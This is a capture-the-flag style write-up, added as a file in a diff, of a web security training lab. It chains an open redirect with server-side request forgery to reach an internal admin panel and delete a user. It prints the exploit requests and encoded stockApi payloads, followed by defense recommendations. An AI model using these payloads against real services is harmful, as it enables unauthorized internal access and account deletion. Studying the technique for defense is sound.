@@ -1,0 +1,100 @@
+================================
+LAB: SSRF with filter bypass via open redirection vulnerability
+================================
+
+[LAB INFORMATION]
+-----------------
+Date: January 28, 2026
+Lab URL: https://0afb006304c6af298283defb00a7003d.web-security-academy.net
+Category: Server-Side Request Forgery (SSRF)
+Level: Practitioner
+Objective: Delete user carlos by accessing the admin interface at http://192.168.0.12:8080/admin
+Description: This lab has a stock check feature that fetches data from an internal system. The stock checker is restricted to only access the local application. An open redirect vulnerability must be found and chained with the SSRF to bypass the filter.
+
+[RECONNAISSANCE]
+----------------
+The application has a stock checker feature accessible via POST /product/stock that accepts a stockApi parameter. Initial testing revealed that direct attempts to access the internal admin interface (http://192.168.0.12:8080/admin) are blocked by a filter that restricts the stock checker to local application URLs only.
+
+Through manual exploration of the application interface, a "Next Product" navigation feature was discovered. Intercepting this request in Burp Suite revealed an interesting endpoint:
+
+GET /product/nextProduct?currentProductId=1&path=/product?productId=2
+
+This endpoint uses a 'path' parameter to control the redirection destination.
+
+[VULNERABILITY DISCOVERY]
+-------------------------
+Two distinct vulnerabilities were identified and chained together:
+
+1. OPEN REDIRECT in /product/nextProduct
+   Testing revealed that the 'path' parameter accepts arbitrary URLs without validation. When tested with an external URL (http://google.com), the server responded with a 301 redirect to the specified location, confirming full control over the redirection destination.
+
+2. SSRF in /product/stock
+   The stock checker makes server-side HTTP requests based on the stockApi parameter. While it has URL filtering to prevent direct access to internal resources, it follows HTTP redirects without re-validating the final destination.
+
+The critical flaw is that the stock checker validates only the initial URL but blindly follows HTTP redirections, creating an opportunity to bypass the whitelist filter.
+
+[EXPLOITATION]
+--------------
+The exploitation process involved chaining the open redirect with the SSRF vulnerability:
+
+Step 1: Confirm open redirect
+Tested the nextProduct endpoint with an external URL to verify redirection behavior:
+GET /product/nextProduct?path=http://google.com
+Result: 301 redirect to google.com (confirmed vulnerability)
+
+Step 2: Access admin panel via SSRF chain
+Modified the stockApi parameter to use the open redirect as a proxy:
+POST /product/stock
+stockApi=/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin
+
+Flow:
+- Stock checker validates /product/nextProduct (passes local URL filter)
+- Stock checker requests the nextProduct endpoint
+- Server responds with 302 redirect to http://192.168.0.12:8080/admin
+- Stock checker follows redirect from server-side (has access to internal network)
+- Admin panel HTML is returned, revealing delete endpoints
+
+Step 3: Delete user carlos
+Modified the path parameter to target the delete endpoint:
+POST /product/stock
+stockApi=/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin/delete?username=carlos
+
+Lab solved successfully.
+
+[EVIDENCE]
+----------
+1. Open redirect confirmation:
+   Request: GET /product/nextProduct?path=http://google.com
+   Response: HTTP/1.1 301 Moved Permanently
+   Location: http://www.google.com/
+
+2. Admin panel access via SSRF:
+   Request: POST /product/stock
+   Body: stockApi=/product/nextProduct%3fcurrentProductId%3d1%26path%3dhttp%3a//192.168.0.12%3a8080/admin
+   Response: HTTP/2 200 OK
+   Body: HTML showing admin panel with delete links for users wiener and carlos
+
+3. Successful exploitation:
+   Request: POST /product/stock
+   Body: stockApi=/product/nextProduct%3fcurrentProductId%3d1%26path%3dhttp%3a//192.168.0.12%3a8080/admin/delete?username=carlos
+   Result: Lab marked as solved, user carlos deleted
+
+[LESSONS LEARNED]
+-----------------
+Key Concepts:
+- SSRF vulnerabilities allow attackers to make the server perform requests on their behalf, bypassing network-level restrictions
+- Open redirects are often considered low-severity, but can become critical when chained with other vulnerabilities
+- URL validation must consider not only the initial URL but also the final destination after following redirects
+- The stock checker operated with different network privileges (internal network access) compared to external clients
+
+Attack Chain Logic:
+- Client → Server (SSRF vector) → Open Redirect → Internal Resource
+- The server acts as an unwitting proxy, leveraging its internal network position
+- Filters that validate only the initial URL without checking redirect destinations are vulnerable
+
+Defense Recommendations:
+- Implement redirect validation or disable automatic redirect following in sensitive server-side request functions
+- Use allowlists for both initial URLs and final destinations
+- Consider network segmentation to limit blast radius
+- Log and monitor server-side requests to internal resources
+- Implement strict URL parsing that rejects or sanitizes path parameters used for redirections
